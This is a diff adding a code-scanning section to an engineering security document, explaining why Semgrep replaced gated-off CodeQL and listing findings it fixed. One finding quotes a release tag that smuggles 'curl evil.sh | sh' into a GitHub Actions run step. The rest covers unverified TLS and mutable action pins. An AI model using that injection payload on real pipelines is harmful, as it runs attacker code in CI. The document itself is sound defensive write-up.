@@ -53,6 +53,54 @@ the edge elsewhere. Anything public and unauthenticated is rate limited.
 one container and useless across replicas. Treat it as a placeholder, not a
 pattern.
 
+## Code scanning
+
+**Semgrep is the scanner. CodeQL is not, and cannot be.**
+
+CodeQL code scanning on a _private_ repository requires GitHub Code Security
+(formerly Advanced Security), a paid add-on. Every product repository here is
+private, so the CodeQL workflows carry
+`if: ${{ !github.event.repository.private }}` and have never run once. The
+estate believed it had code scanning on five repositories and actually had it on
+none — the one repository missing the gate was failing the job instead.
+
+The CodeQL workflows are left in place, gated exactly as they are, so they start
+working by themselves the day a repository goes public or the add-on is bought.
+The `sast` job in each `ci.yml` is what actually scans:
+
+- `semgrep scan`, not `semgrep ci` — the latter expects a Semgrep AppSec
+  Platform token and behaves differently without one.
+- `--error`, so a finding fails the build instead of printing quietly.
+- Findings land in the job log. Uploading SARIF to the Security tab needs the
+  same paid add-on, so the log is the report.
+
+Rules are excluded only with a reason written beside them in the workflow.
+Anything excluded as a false positive was read first; anything excluded as
+backlog is in `adoption.md`.
+
+### What the first run found
+
+Turning it on was not a formality. On the first scan of the estate:
+
+- **Script injection in four deploy workflows.**
+  `raw_tag="${{ github.event.release.tag_name }}"` inside a `run:` block. The
+  expression is substituted into the script _text_ before bash starts, so a tag
+  named `v1"; curl evil.sh | sh; x="` executes — and the `tr` sanitisation two
+  lines below runs far too late to help. Fixed by passing the value through
+  `env:`, where it is data whatever it contains.
+- **TLS without verification.** kini's database connection used
+  `ssl: { rejectUnauthorized: false }` — encryption without authentication,
+  which stops passive sniffing but not an active man-in-the-middle. Verification
+  is now on by default with an explicit, named opt-out and a slot for the CA.
+- **Every third-party action pinned to a mutable tag.** `gitleaks-action@v2`,
+  `codeql-action@v4` and eight others, while `actions/checkout` and
+  `setup-node` were already pinned by SHA. A tag can be silently repointed by
+  its owner; that is how the `tj-actions/changed-files` and `trivy-action`
+  compromises worked. All ten are now pinned to full commit SHAs.
+- **Dependabot with no cooldown**, so a compromised release could be proposed
+  within hours of publication. Every ecosystem entry in all seven repositories
+  now waits seven days.
+
 ## Supply chain
 
 | Control               | Runs                            |
